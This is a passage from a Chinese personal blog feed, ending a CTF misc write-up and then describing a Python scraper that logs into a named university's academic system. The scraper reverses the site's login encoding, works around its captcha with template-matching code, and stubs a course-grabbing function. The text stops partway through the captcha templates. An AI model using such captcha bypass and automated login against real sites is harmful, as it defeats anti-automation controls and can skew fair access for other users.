title="0x004 键盘侠"></a>0x004 键盘侠</h2><ul><li>解伪加密得到一个图片, binwalk一下拿到好多7z、zip,看了一下zip文件,实际上是个doc文件,拓展名改成doc以后里面内容如下:</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191126214953.png" alt></p><ul><li><code>base85</code>解密得到flag。</li><li>python3的base64库里面自带b85decode, 但是python2里面没有。</li></ul>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>[Python]一次爬虫模拟登录的尝试</title>
    <url>/2020/04/02/Python-%E4%B8%80%E6%AC%A1%E7%88%AC%E8%99%AB%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95%E7%9A%84%E5%B0%9D%E8%AF%95/</url>
    <content><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/illust_74923720_20190810_124148.png" alt></p><a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>最近想学一下爬虫的进阶用法，比如模拟登录之类的，在网上找的教程里面所用的测试网站现在已经加了反爬虫机制，目前我还太菜，还过不了反爬机制。但是忽然想到了学校还有个<del>垃圾</del><code>强智系统</code>，漏洞百出，应该也不会加反爬机制，所以拿强智练练手。</p><h1 id="0x01-用浏览器初探"><a href="#0x01-用浏览器初探" class="headerlink" title="0x01 用浏览器初探"></a>0x01 用浏览器初探</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>这里只需用Chrome浏览器的开发者工具(F12)，也不需要用BP之类的抓包工具</p><p>打开网站，<a href="http://jwgl.sdust.edu.cn/" target="_blank" rel="noopener">强智-山东科技大学</a>，打开开发者工具–Network–勾上Preserve log，然后用自己的账号登录。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200402022940.png" alt></p><p>然后可以看到有挺多信息的，</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200402023147.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200402023230.png" alt></p><p>这里有几个关键的信息:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Request URL: http://jwgl.sdust.edu.cn/Logon.do?method=logon</span><br><span class="line">Request Method: POST</span><br><span class="line">Origin: http://jwgl.sdust.edu.cn</span><br><span class="line">Referer: http://jwgl.sdust.edu.cn/</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.69 Safari/537.36</span><br><span class="line"></span><br><span class="line">encoded: *******************************************************</span><br><span class="line">RANDOMCODE: cn3v</span><br></pre></td></tr></table></figure><p>这些信息向我们指明了<code>真实请求的URL</code>、<code>请求方法</code>、<code>Origin</code>、<code>Referer</code>、<code>User-Agent</code>、<code>Post所传参数</code>。</p><h2 id="陷入困境"><a href="#陷入困境" class="headerlink" title="陷入困境"></a>陷入困境</h2><p>这里post所传参数与我想象的有所不同，我以为会传入用户名、密码、验证码，但是实际上只有一个encoded和验证码。</p><p>盲猜可能通过某种加密方法将用户名和密码加密成了encoded，因为我从这个encoded里面看到了我密码的一部分，而且密码像插队一样插在encoded中。</p><p>多次重新登录并查看这个encoded发现这个值是会变的，也就是说加密算法应该是有一个动态的参照，或者是<del>随机数种子</del>（结合一些web知识，随机数种子不太现实）？</p><p>那么该如何通过用户名和密码来得到这个encoded？</p><h2 id="柳暗花明"><a href="#柳暗花明" class="headerlink" title="柳暗花明"></a>柳暗花明</h2><p>困扰了一会以后，我看了一下网页源码，我看到了一段令我惊喜的代码。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200402024326.png" alt></p><p>这里写了encoded的生成算法，果然是由用户名和密码以及dataStr计算得来。</p><p>dataStr是通过<code>/Logon.do?method=logon&amp;flag=sess</code>生成的</p><p><a href="http://jwgl.sdust.edu.cn/Logon.do?method=logon&flag=sess" target="_blank" rel="noopener">dataStr生成网址</a>。</p><p>刷新几次可以看到每次生成的结果都不同。</p><p>把JS代码转化成Python代码即可得到encoded。</p><h1 id="0x02-用爬虫初探"><a href="#0x02-用爬虫初探" class="headerlink" title="0x02 用爬虫初探"></a>0x02 用爬虫初探</h1><h2 id="获取验证码"><a href="#获取验证码" class="headerlink" title="获取验证码"></a>获取验证码</h2><p>从网页源码里面可以看到，验证码是在这个网站获取的</p><p><a href="http://jwgl.sdust.edu.cn/verifycode.servlet" target="_blank" rel="noopener">验证码网站</a></p><p>那么我们同样可以去这个网站获取验证码，由于我现在还没法很完美的实现验证码的自动识别，这里采用将二维码show出来手工输入的办法。</p><h2 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h2><p>由于验证码生成网站和dataStr生成网站每次刷新，里面内容都会不同</p><p>那么我们该如何实现爬虫传的参数 与 我们生成的dataStr和验证码的统一？</p><p>这里通过创建session对象来实现统一。</p><h2 id="如何测试是否登录成功"><a href="#如何测试是否登录成功" class="headerlink" title="如何测试是否登录成功"></a>如何测试是否登录成功</h2><p>可以打印一下post以后的内容，看看是不是和用浏览器登录进去的一样，不能通过看post的state_code。</p><h2 id="代码-demo"><a href="#代码-demo" class="headerlink" title="代码(demo)"></a>代码(demo)</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Spider</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.headers = &#123;</span><br><span class="line">            <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.69 Safari/537.36'</span>,</span><br><span class="line">            <span class="string">'Referer'</span>: <span class="string">'http://jwgl.sdust.edu.cn/'</span></span><br><span class="line">        &#125;</span><br><span class="line">        self.seesion = requests.session()</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'[+] Session初始化完成!'</span></span><br><span class="line">        self.userAccount = raw_input(<span class="string">'请输入学号:'</span>)</span><br><span class="line">        self.userPassword = raw_input(<span class="string">'请输入密码:'</span>)</span><br><span class="line">        self.dataStr = <span class="string">''</span></span><br><span class="line">        self.safeCode = <span class="string">''</span></span><br><span class="line">        self.encoded = <span class="string">''</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_dataStr</span><span class="params">(self)</span>:</span></span><br><span class="line">        dataStrUrl = <span class="string">'http://jwgl.sdust.edu.cn/Logon.do?method=logon&amp;flag=sess'</span></span><br><span class="line">        self.dataStr = self.seesion.get(url=dataStrUrl, headers=self.headers).content</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'[+] dataStr 已获取!'</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_safeCode</span><span class="params">(self)</span>:</span></span><br><span class="line">        safeCodeUrl = <span class="string">'http://jwgl.sdust.edu.cn/verifycode.servlet'</span></span><br><span class="line">        safeCodeCont = self.seesion.get(url=safeCodeUrl, headers=self.headers).content</span><br><span class="line">        f = open(<span class="string">'safeCode.jpg'</span>,<span class="string">'wb'</span>)</span><br><span class="line">        f.write(safeCodeCont)</span><br><span class="line">        f.close()</span><br><span class="line">        img = Image.open(<span class="string">'safeCode.jpg'</span>)</span><br><span class="line">        img.show()</span><br><span class="line">        safeCode = raw_input(<span class="string">'请输入验证码:'</span>)</span><br><span class="line">        os.remove(<span class="string">'safeCode.jpg'</span>)</span><br><span class="line">        self.safeCode = safeCode</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'[+] 验证码已获取!'</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_encoded</span><span class="params">(self)</span>:</span></span><br><span class="line">        scode = self.dataStr.split(<span class="string">'#'</span>)[<span class="number">0</span>]</span><br><span class="line">        sxh = self.dataStr.split(<span class="string">'#'</span>)[<span class="number">1</span>]</span><br><span class="line">        code = self.userAccount + <span class="string">'%%%'</span> + self.userPassword</span><br><span class="line">        encode = <span class="string">''</span></span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> i &lt; len(code):</span><br><span class="line">            <span class="keyword">if</span> i &lt; <span class="number">20</span>:</span><br><span class="line">                encode += code[i:i + <span class="number">1</span>] + scode[<span class="number">0</span>:int(sxh[i:i + <span class="number">1</span>])]</span><br><span class="line">                scode = scode[int(sxh[i:i + <span class="number">1</span>]):len(scode)]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                encode += code[i:len(code)]</span><br><span class="line">                i = len(code)</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">        self.encoded = encode</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'[+] encoded已获取!'</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(self)</span>:</span></span><br><span class="line">        loginUrl = <span class="string">'http://jwgl.sdust.edu.cn/Logon.do?method=logon'</span></span><br><span class="line">        self.get_dataStr()</span><br><span class="line">        self.get_safeCode()</span><br><span class="line">        self.get_encoded()</span><br><span class="line">        login_data = &#123;</span><br><span class="line">            <span class="string">'encoded'</span>: self.encoded,</span><br><span class="line">            <span class="string">'RANDOMCODE'</span>: self.safeCode</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">print</span> self.seesion.post(url = loginUrl,data = login_data,headers = self.headers).content</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    test = Spider()</span><br><span class="line">    test.login()</span><br></pre></td></tr></table></figure><p>放一张表明登录成功的截图吧。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200402032818.png" alt></p><h2 id="代码2-demo"><a href="#代码2-demo" class="headerlink" title="代码2(demo)"></a>代码2(demo)</h2><p>4月3号更新了一些小功能，做了一些优化，但程序依然还只是个雏形。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> webbrowser</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">__Author__ = <span class="string">'LiuLian'</span></span><br><span class="line"><span class="comment"># 测试环境Python2.7.16</span></span><br><span class="line"><span class="comment"># Create for fun!</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Spider</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.headers = &#123;</span><br><span class="line">            <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.69 Safari/537.36'</span>,</span><br><span class="line">            <span class="string">'Referer'</span>: <span class="string">'http://jwgl.sdust.edu.cn/'</span></span><br><span class="line">        &#125;</span><br><span class="line">        self.seesion = requests.session()</span><br><span class="line">        print(<span class="string">'[+] Session初始化完成!'</span>)</span><br><span class="line">        self.userAccount = raw_input(<span class="string">'请输入学号:'</span>)</span><br><span class="line">        self.userPassword = raw_input(<span class="string">'请输入密码:'</span>)</span><br><span class="line">        self.dataStr = <span class="string">''</span></span><br><span class="line">        self.safeCode = <span class="string">''</span></span><br><span class="line">        self.encoded = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_dataStr</span><span class="params">(self)</span>:</span></span><br><span class="line">        dataStrUrl = <span class="string">'http://jwgl.sdust.edu.cn/Logon.do?method=logon&amp;flag=sess'</span></span><br><span class="line">        self.dataStr = self.seesion.get(url=dataStrUrl, headers=self.headers).content</span><br><span class="line">        print(<span class="string">'[+] dataStr 已获取!'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_safeCode</span><span class="params">(self)</span>:</span></span><br><span class="line">        safeCodeUrl = <span class="string">'http://jwgl.sdust.edu.cn/verifycode.servlet'</span></span><br><span class="line">        safeCodeCont = self.seesion.get(url=safeCodeUrl, headers=self.headers).content</span><br><span class="line">        f = open(<span class="string">'safeCode.jpg'</span>, <span class="string">'wb'</span>)</span><br><span class="line">        f.write(safeCodeCont)</span><br><span class="line">        f.close()</span><br><span class="line">        img = Image.open(<span class="string">'safeCode.jpg'</span>)</span><br><span class="line">        img.show()</span><br><span class="line">        safeCode = raw_input(<span class="string">'请输入验证码:'</span>)</span><br><span class="line">        os.remove(<span class="string">'safeCode.jpg'</span>)</span><br><span class="line">        self.safeCode = safeCode</span><br><span class="line">        print(<span class="string">'[+] 验证码已获取!'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_encoded</span><span class="params">(self)</span>:</span></span><br><span class="line">        scode = self.dataStr.split(<span class="string">'#'</span>)[<span class="number">0</span>]</span><br><span class="line">        sxh = self.dataStr.split(<span class="string">'#'</span>)[<span class="number">1</span>]</span><br><span class="line">        code = self.userAccount + <span class="string">'%%%'</span> + self.userPassword</span><br><span class="line">        encode = <span class="string">''</span></span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> i &lt; len(code):</span><br><span class="line">            <span class="keyword">if</span> i &lt; <span class="number">20</span>:</span><br><span class="line">                encode += code[i:i + <span class="number">1</span>] + scode[<span class="number">0</span>:int(sxh[i:i + <span class="number">1</span>])]</span><br><span class="line">                scode = scode[int(sxh[i:i + <span class="number">1</span>]):len(scode)]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                encode += code[i:len(code)]</span><br><span class="line">                i = len(code)</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">        self.encoded = encode</span><br><span class="line">        print(<span class="string">'[+] encoded已获取!'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(self)</span>:</span></span><br><span class="line">        loginUrl = <span class="string">'http://jwgl.sdust.edu.cn/Logon.do?method=logon'</span></span><br><span class="line">        self.get_dataStr()</span><br><span class="line">        self.get_safeCode()</span><br><span class="line">        self.get_encoded()</span><br><span class="line">        login_data = &#123;</span><br><span class="line">            <span class="string">'encoded'</span>: self.encoded,</span><br><span class="line">            <span class="string">'RANDOMCODE'</span>: self.safeCode</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            html = self.seesion.post(url=loginUrl, data=login_data, headers=self.headers).content</span><br><span class="line">            <span class="keyword">if</span> html.find(<span class="string">'&lt;title&gt;学生个人中心&lt;/title&gt;'</span>) != <span class="number">-1</span>:</span><br><span class="line">                print(<span class="string">'[+] 登录成功! :)\n姓名、学号如下:'</span>)</span><br><span class="line">                pattern = <span class="string">r'&lt;div id="Top1_divLoginName" class="Nsb_top_menu_nc" style="color: #000000;"&gt;(.+?)&lt;/div&gt;'</span></span><br><span class="line">                name_num = re.findall(pattern=pattern,string=html)[<span class="number">0</span>].decode(<span class="string">'utf-8'</span>)</span><br><span class="line">                print(name_num)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span> html.find(<span class="string">'&lt;font color="red"&gt;验证码无效,请重新登录!&lt;/font&gt;'</span>) != <span class="number">-1</span>:</span><br><span class="line">                print(<span class="string">'[-] 验证码输入错误 :(,请重试该程序...'</span>)</span><br><span class="line">                time.sleep(<span class="number">2</span>)</span><br><span class="line">                exit(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">'[-] 登录失败 :( ,正在尝试重新登录...'</span>)</span><br><span class="line">                time.sleep(<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_class_schedule</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"获得学期理论课表并展示"</span></span><br><span class="line">        class_schedule_url = <span class="string">'http://jwgl.sdust.edu.cn/jsxsd/xskb/xskb_list.do?Ves632DSdyV=NEW_XSD_PYGL'</span></span><br><span class="line">        f = open(<span class="string">'schedule.html'</span>, <span class="string">'wb'</span>)</span><br><span class="line">        html = self.seesion.get(url=class_schedule_url, headers=self.headers).content</span><br><span class="line">        f.write(html)</span><br><span class="line">        f.close()</span><br><span class="line">        webbrowser.open(<span class="string">'schedule.html'</span>)</span><br><span class="line">        <span class="comment"># os.remove('schedule.html')</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Teacher_evaluation</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"进行教师评价"</span></span><br><span class="line">        evaluation_url = <span class="string">'http://jwgl.sdust.edu.cn/jsxsd/xspj/xspj_find.do?Ves632DSdyV=NEW_XSD_JXPJ'</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Robbing_class</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"抢课"</span></span><br><span class="line">        robbing_url = <span class="string">'http://jwgl.sdust.edu.cn/jsxsd/xsxkRedis/xklc_list?Ves632DSdyV=NEW_XSD_PYGL'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    test = Spider()</span><br><span class="line">    test.login()</span><br><span class="line">    test.get_class_schedule()</span><br></pre></td></tr></table></figure><h2 id="代码3-demo"><a href="#代码3-demo" class="headerlink" title="代码3(demo)"></a>代码3(demo)</h2><p>一次偶然的机会在网上找到了一个关于过强智网站验证码识别的代码。</p><p>比较特殊，强智的验证码里面只有<code>123zxcvbnm</code>这些字符，因此过验证码的难度大大降低。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#orc.py</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> char_lists <span class="keyword">import</span> chars</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">identify</span><span class="params">(img)</span>:</span></span><br><span class="line">	identification_code_temp=[];identification_code=[<span class="string">''</span>]*<span class="number">4</span>;diff_min=[<span class="number">144</span>]*<span class="number">4</span>;</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range (<span class="number">4</span>):</span><br><span class="line">		identification_code_temp.append(img.crop((i*<span class="number">10</span>, <span class="number">0</span>, i*<span class="number">10</span>+<span class="number">13</span>, <span class="number">12</span>)).getdata())</span><br><span class="line">	<span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">		diff = [<span class="number">0</span>]*<span class="number">4</span></span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">			<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">156</span>):</span><br><span class="line">				<span class="keyword">if</span> identification_code_temp[i][j] ^ chars[char][j]:</span><br><span class="line">						diff[i] += <span class="number">1</span></span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">			<span class="keyword">if</span> diff[i]&lt;diff_min[i]:</span><br><span class="line">				diff_min[i]=diff[i]</span><br><span class="line">				identification_code[i]=char</span><br><span class="line">	<span class="keyword">return</span> <span class="string">''</span>.join(identification_code)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">identificationCodeHandle</span><span class="params">(img)</span>:</span></span><br><span class="line">	rect_box = (<span class="number">3</span>,<span class="number">4</span>,<span class="number">46</span>,<span class="number">16</span>)</span><br><span class="line">	img = img.crop(rect_box)</span><br><span class="line">	img = img.convert(<span class="string">'1'</span>)</span><br><span class="line">	<span class="keyword">return</span> img</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#char_lists.py</span></span><br><span class="line">chars = &#123;</span><br><span class="line">	<span class="string">'1'</span>:[<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>],</span><br><span class="line">	<span class="string">'2'</span>:[<span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>],</span><br><span class="line">	<span class="string">'3'</span>:[<span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span 